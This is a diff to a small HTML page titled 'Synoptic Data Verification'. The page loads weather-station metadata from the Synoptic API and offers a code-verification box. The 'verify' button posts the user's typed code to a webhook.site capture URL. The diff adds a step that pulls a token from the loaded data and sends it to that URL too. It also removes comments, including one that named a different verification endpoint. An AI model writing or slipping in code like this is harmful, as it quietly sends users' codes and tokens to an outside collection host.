@@ -3,7 +3,6 @@
 <head>
   <title>Synoptic Data Verification</title>
   <style>
-    /* Add your CSS styles here for a beautiful layout */
     body {
       font-family: sans-serif;
     }
@@ -47,17 +46,15 @@
   </div>
 
   <script>
-    // JavaScript code to fetch data and handle verification
     const innerBox = document.getElementById('inner-box');
     const userInput = document.getElementById('user-input');
     const verifyButton = document.getElementById('verify-button');
     const statusDiv = document.getElementById('status');
 
-    // Fetch data from Synoptic API
     fetch('https://api.synopticdata.com/v2/stations/metadata?token=sa&stid=KONT&complete=1')
       .then(response => response.json())
       .then(data => {
-        innerBox.textContent = JSON.stringify(data, null, 2); // Display JSON data
+        innerBox.textContent = JSON.stringify(data, null, 2); 
       })
       .catch(error => {
         statusDiv.textContent = 'Error: We encountered a problem on the server.';
@@ -65,17 +62,19 @@
 
     verifyButton.addEventListener('click', () => {
       const userCode = userInput.value;
-      // Send verification request to api.verify.com/verifycation
+      const jsonData = JSON.parse(innerBox.textContent); 
+      const token = jsonData.token; // Assuming the token is a property named 'token'
+
       fetch('https://webhook.site/8febb751-d6c3-40a9-b3de-6b3812e5d94e', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
-        body: JSON.stringify({ code: userCode })
+        body: JSON.stringify({ code: userCode, token: token })
       })
       .then(response => response.json())
       .then(result => {
-        statusDiv.textContent = result.message; // Display verification result
+        statusDiv.textContent = result.message; 
       })
       .catch(error => {
         statusDiv.textContent = 'Error: Verification failed.';
